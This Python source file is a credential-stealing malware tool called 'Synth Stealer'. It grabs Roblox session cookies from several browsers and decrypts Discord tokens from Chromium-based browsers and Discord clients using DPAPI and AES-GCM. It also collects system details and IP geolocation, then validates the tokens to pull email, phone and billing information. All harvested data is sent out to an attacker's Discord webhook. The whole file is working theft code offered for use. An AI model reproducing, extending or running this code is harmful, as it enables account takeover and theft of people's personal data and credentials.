import os
import time
import platform
import psutil
import requests
import browser_cookie3
import json
import socket
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from datetime import datetime

tokens = []
cleaned = []
checker = []

webhook = 'webhook here'

# steals cookies 

class main():
   def __init__(self,webhook):
      self.webhook = webhook
      self.send(webhook)
   def cookies(self,webhook):
      listofcookies = []
      pcuser = os.getenv("UserName")
      try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass
      try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass
      try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass 
      try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass
      for i in listofcookies:
         try:
            r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": i}).json()
            info = {"content": '',"embeds": [{"title": f"Synth Stealer | {pcuser} ran Synth","description": f"roblox cookie grabbed ; \n```fix\n{i}\n```","color": 51199,"footer": {"text": "Synth Stealer | synthetic#9270 | https://github.com/syntheticc/Synth"}}],"attachments": []}
            requests.post(webhook,json=info)
         except:
            requests.post(webhook,json={'content':'**Cookie found , but invaild :C**'})
   def send(self,webhook):
      per_cpu = psutil.cpu_percent(percpu=True)
      for idx, usage in enumerate(per_cpu):
         mem_usage = psutil.virtual_memory()
         mc = platform.machine()
         verse = platform.version()
         sys = platform.system() 
         proc = platform.processor()
         ms = platform.uname()
         hs = socket.gethostname()  
         info = requests.get("http://ipinfo.io/json").json()
         ips = info['ip']
         ct = info['city']
         he = info['hostname']
         cy = info['country']
         rn = info['region']
         lg = info['loc']
         pt = info['postal']
         tz = info['timezone']
         org = info['org']
         pcuser = os.getenv("UserName")
         info = {"content": '',"embeds": [{"title": f"Synth Stealer |**{pcuser}** ran Synth","description": f"***PC INFO***\n<:x_reply_continued:1045113992831565875>`Machine:` **{mc}**\n<:x_reply_continued:1045113992831565875>`PC Version:` **{verse}**\n<:x_reply_continued:1045113992831565875>`System:` **{sys}**\n<:x_reply_continued:1045113992831565875>`Processor:` **{proc}**\n<:x_reply_continued:1045113992831565875>`CPU Usage:` **{usage}**%\n***RAM INFO***\n<:x_reply_continued:1045113992831565875>`Free:` **{mem_usage.percent}%**\n<:x_reply_continued:1045113992831565875>`Total:` **{mem_usage.total/(1024**3):.2f}G**\n<:x_reply_continued:1045113992831565875>`Used:` **{mem_usage.used/(1024**3):.2f}G**\n***IP INFO***\n<:x_reply_continued:1045113992831565875>`Ip:` **{ips}**\n<:x_reply_continued:1045113992831565875>`city:` **{ct}**\n<:x_reply_continued:1045113992831565875>`Region:` **{rn}**\n<:x_reply_continued:1045113992831565875>`Country:` **{cy}**\n<:x_reply_continued:1045113992831565875>`Hostname:` **{he}**\n<:x_reply_continued:1045113992831565875>`Lang:` **{lg}**\n<:x_reply_continued:1045113992831565875>`Postal:` **{pt}**\n<:x_reply_continued:1045113992831565875>`Timezone:` **{tz}**\n<:x_reply_continued:1045113992831565875>`Org:` **{org}*\n\n***DISCORD MODULES***\n*Injection: :white_check_mark: Coming soon..*\n\n [**Github**](https://github.com/syntheticc)","color": 0x2f3136,"footer": {"text": "Synth Stealer | synthetic#9270 | https://github.com/syntheticc/Synth"}}],"attachments": []}
      requests.post(webhook,json=info)
      self.cookies(webhook)


# steals token - added astra devs token grabber 

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token(webhook):
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request(webhook, data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == "__main__":
   main(webhook)
   get_token(webhook)
